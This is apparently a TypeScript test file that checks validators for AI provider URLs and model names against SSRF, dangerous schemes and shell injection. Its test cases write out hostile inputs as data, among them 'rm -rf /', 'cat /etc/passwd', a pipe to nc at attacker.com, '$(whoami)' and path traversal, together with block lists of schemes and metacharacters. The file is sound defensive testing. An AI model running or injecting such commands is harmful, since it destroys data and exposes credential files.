/**
 * AI Endpoint Validation Security Tests
 * 
 * Tests URL validation and model name sanitization for AI provider configuration.
 * These tests ensure that user-provided AI endpoints are safe and don't introduce
 * security vulnerabilities like SSRF, command injection, or data exfiltration.
 * 
 * Security Policy (Moderate - Option B):
 * - Allow: https:// URLs
 * - Allow: http://localhost and http://127.0.0.1 (for Ollama/local AI)
 * - Block: javascript:, file://, data://, ftp://, and other dangerous schemes
 * - Block: URLs with embedded credentials
 * - Block: Model names with shell metacharacters or path traversal
 */

import { describe, it, expect } from 'vitest';

/**
 * URL Validation Functions
 * These would typically be in src/utils/validation.ts or similar
 */

// Allowed URL schemes
const ALLOWED_SCHEMES = ['https:', 'http:'];

// Localhost patterns for http (Ollama support)
const LOCALHOST_PATTERNS = [
  'localhost',
  '127.0.0.1',
  '::1',
  '[::1]',
];

// Dangerous schemes that must be blocked
const BLOCKED_SCHEMES = [
  'javascript:',
  'file:',
  'data:',
  'ftp:',
  'sftp:',
  'gopher:',
  'ldap:',
  'dict:',
];

/**
 * Validates an AI provider base URL
 * Returns { valid: true } or { valid: false, reason: string }
 */
function validateAIUrl(urlString: string | undefined | null): { valid: boolean; reason?: string } {
  // Handle null/undefined
  if (urlString === null || urlString === undefined) {
    return { valid: false, reason: 'URL is required' };
  }
  
  if (typeof urlString !== 'string') {
    return { valid: false, reason: 'URL is required' };
  }

  const trimmed = urlString.trim();
  
  if (trimmed.length === 0) {
    return { valid: false, reason: 'URL cannot be empty' };
  }

  // Check for blocked schemes first (before URL parsing)
  const lowerUrl = trimmed.toLowerCase();
  for (const scheme of BLOCKED_SCHEMES) {
    if (lowerUrl.startsWith(scheme)) {
      return { valid: false, reason: `Blocked scheme: ${scheme}` };
    }
  }

  // Parse URL
  let url: URL;
  try {
    url = new URL(trimmed);
  } catch {
    return { valid: false, reason: 'Invalid URL format' };
  }

  // Check for embedded credentials
  if (url.username || url.password) {
    return { valid: false, reason: 'URLs with embedded credentials are not allowed' };
  }

  // Check scheme
  if (!ALLOWED_SCHEMES.includes(url.protocol)) {
    return { valid: false, reason: `Unsupported protocol: ${url.protocol}` };
  }

  // For http:// (non-https), only allow localhost
  if (url.protocol === 'http:') {
    const hostname = url.hostname.toLowerCase();
    const isLocalhost = LOCALHOST_PATTERNS.some(
      (pattern) => hostname === pattern || hostname.endsWith(`.${pattern}`)
    );
    
    if (!isLocalhost) {
      return { valid: false, reason: 'HTTP is only allowed for localhost (use HTTPS for remote hosts)' };
    }
  }

  return { valid: true };
}

/**
 * Model Name Validation
 * Prevents command injection and path traversal in model names
 */

// Allowed model name pattern (alphanumeric, hyphens, underscores, colons, slashes, dots)
const MODEL_NAME_PATTERN = /^[a-zA-Z0-9_\-.:\/]+$/;

// Maximum model name length
const MAX_MODEL_NAME_LENGTH = 256;

// Blocked patterns
const BLOCKED_MODEL_PATTERNS = [
  '..', // Path traversal
  '\n', // Newline injection
  '\r', // Carriage return
  '\0', // Null byte
  ';',  // Command separator
  '&',  // Command chaining
  '|',  // Pipe
  '$',  // Variable expansion
  '`',  // Command substitution
  '$(', // Command substitution
  '${', // Variable expansion
];

function validateModelName(modelName: string | undefined | null): { valid: boolean; reason?: string } {
  // Handle null/undefined
  if (modelName === null || modelName === undefined) {
    return { valid: false, reason: 'Model name is required' };
  }
  
  if (typeof modelName !== 'string') {
    return { valid: false, reason: 'Model name is required' };
  }

  const trimmed = modelName.trim();
  
  if (trimmed.length === 0) {
    return { valid: false, reason: 'Model name cannot be empty' };
  }

  // Check length
  if (trimmed.length > MAX_MODEL_NAME_LENGTH) {
    return { valid: false, reason: `Model name exceeds maximum length of ${MAX_MODEL_NAME_LENGTH}` };
  }

  // Check for blocked patterns
  for (const pattern of BLOCKED_MODEL_PATTERNS) {
    if (trimmed.includes(pattern)) {
      return { valid: false, reason: `Model name contains blocked pattern: ${pattern}` };
    }
  }

  // Check against allowed pattern
  if (!MODEL_NAME_PATTERN.test(trimmed)) {
    return { valid: false, reason: 'Model name contains invalid characters' };
  }

  return { valid: true };
}

// =============================================================================
// Tests
// =============================================================================

describe('AI Validation Security', () => {
  describe('URL Validation', () => {
    describe('Allowed URLs', () => {
      it('allows HTTPS URLs', () => {
        const result = validateAIUrl('https://api.openai.com/v1');
        expect(result.valid).toBe(true);
      });

      it('allows http://localhost for Ollama', () => {
        const result = validateAIUrl('http://localhost:11434/v1');
        expect(result.valid).toBe(true);
      });

      it('allows http://127.0.0.1 for local AI', () => {
        const result = validateAIUrl('http://127.0.0.1:11434/v1');
        expect(result.valid).toBe(true);
      });

      it('allows HTTPS with port numbers', () => {
        const result = validateAIUrl('https://api.example.com:8443/v1');
        expect(result.valid).toBe(true);
      });

      it('allows HTTPS with paths', () => {
        const result = validateAIUrl('https://api.example.com/openai/v1/chat/completions');
        expect(result.valid).toBe(true);
      });
    });

    describe('Blocked URLs', () => {
      it('blocks javascript: URLs', () => {
        const result = validateAIUrl('javascript:alert(document.cookie)');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('Blocked scheme');
      });

      it('blocks file:// URLs', () => {
        const result = validateAIUrl('file:///etc/passwd');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('Blocked scheme');
      });

      it('blocks data: URLs', () => {
        const result = validateAIUrl('data:text/html,<script>alert(1)</script>');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('Blocked scheme');
      });

      it('blocks ftp:// URLs', () => {
        const result = validateAIUrl('ftp://ftp.example.com/file');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('Blocked scheme');
      });

      it('blocks URLs with embedded credentials', () => {
        const result = validateAIUrl('https://user:password@api.example.com/v1');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('embedded credentials');
      });

      it('blocks empty/whitespace URLs', () => {
        expect(validateAIUrl('')).toEqual({ valid: false, reason: 'URL cannot be empty' });
        expect(validateAIUrl('   ')).toEqual({ valid: false, reason: 'URL cannot be empty' });
        expect(validateAIUrl(null)).toEqual({ valid: false, reason: 'URL is required' });
        expect(validateAIUrl(undefined)).toEqual({ valid: false, reason: 'URL is required' });
      });

      it('blocks http:// to non-localhost hosts', () => {
        const result = validateAIUrl('http://api.example.com/v1');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('HTTP is only allowed for localhost');
      });

      it('blocks gopher:// URLs', () => {
        const result = validateAIUrl('gopher://example.com/');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('Blocked scheme');
      });

      it('blocks ldap:// URLs', () => {
        const result = validateAIUrl('ldap://example.com/');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('Blocked scheme');
      });
    });

    describe('Edge Cases', () => {
      it('handles malformed URLs gracefully', () => {
        const result = validateAIUrl('not-a-valid-url');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('Invalid URL format');
      });

      it('handles URLs with only scheme', () => {
        const result = validateAIUrl('https://');
        expect(result.valid).toBe(false);
      });

      it('is case-insensitive for scheme blocking', () => {
        expect(validateAIUrl('JAVASCRIPT:alert(1)').valid).toBe(false);
        expect(validateAIUrl('JavaScript:alert(1)').valid).toBe(false);
        expect(validateAIUrl('FILE:///etc/passwd').valid).toBe(false);
      });
    });
  });

  describe('Model Name Validation', () => {
    describe('Allowed Model Names', () => {
      it('allows alphanumeric model names', () => {
        const result = validateModelName('gpt4');
        expect(result.valid).toBe(true);
      });

      it('allows model names with hyphens/underscores', () => {
        expect(validateModelName('gpt-4-turbo').valid).toBe(true);
        expect(validateModelName('gpt_4_turbo').valid).toBe(true);
      });

      it('allows model names with colons (ollama format)', () => {
        const result = validateModelName('llama3:8b');
        expect(result.valid).toBe(true);
      });

      it('allows model names with slashes (org/model)', () => {
        const result = validateModelName('openai/gpt-4-turbo');
        expect(result.valid).toBe(true);
      });

      it('allows model names with dots', () => {
        const result = validateModelName('model.v1.2.3');
        expect(result.valid).toBe(true);
      });

      it('allows complex model identifiers', () => {
        const result = validateModelName('meta-llama/Llama-3.3-70B-Instruct:fp16');
        expect(result.valid).toBe(true);
      });
    });

    describe('Blocked Model Names', () => {
      it('blocks model names with shell metacharacters', () => {
        expect(validateModelName('model; rm -rf /').valid).toBe(false);
        expect(validateModelName('model && cat /etc/passwd').valid).toBe(false);
        expect(validateModelName('model | nc attacker.com').valid).toBe(false);
      });

      it('blocks model names with path traversal', () => {
        const result = validateModelName('../../../etc/passwd');
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('blocked pattern');
      });

      it('blocks model names exceeding max length', () => {
        const longName = 'a'.repeat(257);
        const result = validateModelName(longName);
        expect(result.valid).toBe(false);
        expect(result.reason).toContain('maximum length');
      });

      it('blocks empty model names', () => {
        expect(validateModelName('')).toEqual({ valid: false, reason: 'Model name cannot be empty' });
        expect(validateModelName('   ')).toEqual({ valid: false, reason: 'Model name cannot be empty' });
        expect(validateModelName(null)).toEqual({ valid: false, reason: 'Model name is required' });
        expect(validateModelName(undefined)).toEqual({ valid: false, reason: 'Model name is required' });
      });

      it('blocks model names with newlines', () => {
        const result = validateModelName('model\nmalicious');
        expect(result.valid).toBe(false);
      });

      it('blocks model names with command substitution', () => {
        expect(validateModelName('model$(whoami)').valid).toBe(false);
        expect(validateModelName('model`whoami`').valid).toBe(false);
      });

      it('blocks model names with variable expansion', () => {
        expect(validateModelName('model$HOME').valid).toBe(false);
        expect(validateModelName('model${HOME}').valid).toBe(false);
      });

      it('blocks model names with null bytes', () => {
        const result = validateModelName('model\0malicious');
        expect(result.valid).toBe(false);
      });
    });

    describe('Edge Cases', () => {
      it('handles whitespace trimming', () => {
        const result = validateModelName('  gpt-4  ');
        expect(result.valid).toBe(true);
      });

      it('accepts exactly max length model name', () => {
        const maxLengthName = 'a'.repeat(256);
        const result = validateModelName(maxLengthName);
        expect(result.valid).toBe(true);
      });
    });
  });

  describe('Integration Scenarios', () => {
    it('validates typical OpenAI configuration', () => {
      const url = validateAIUrl('https://api.openai.com/v1');
      const model = validateModelName('gpt-4-turbo-preview');
      
      expect(url.valid).toBe(true);
      expect(model.valid).toBe(true);
    });

    it('validates typical Ollama configuration', () => {
      const url = validateAIUrl('http://localhost:11434/v1');
      const model = validateModelName('llama3:8b');
      
      expect(url.valid).toBe(true);
      expect(model.valid).toBe(true);
    });

    it('validates Azure OpenAI configuration', () => {
      const url = validateAIUrl('https://my-resource.openai.azure.com/openai/deployments/gpt-4');
      const model = validateModelName('gpt-4');
      
      expect(url.valid).toBe(true);
      expect(model.valid).toBe(true);
    });

    it('validates self-hosted vLLM configuration', () => {
      const url = validateAIUrl('https://vllm.internal.company.com/v1');
      const model = validateModelName('meta-llama/Llama-3.3-70B-Instruct');
      
      expect(url.valid).toBe(true);
      expect(model.valid).toBe(true);
    });
  });
});
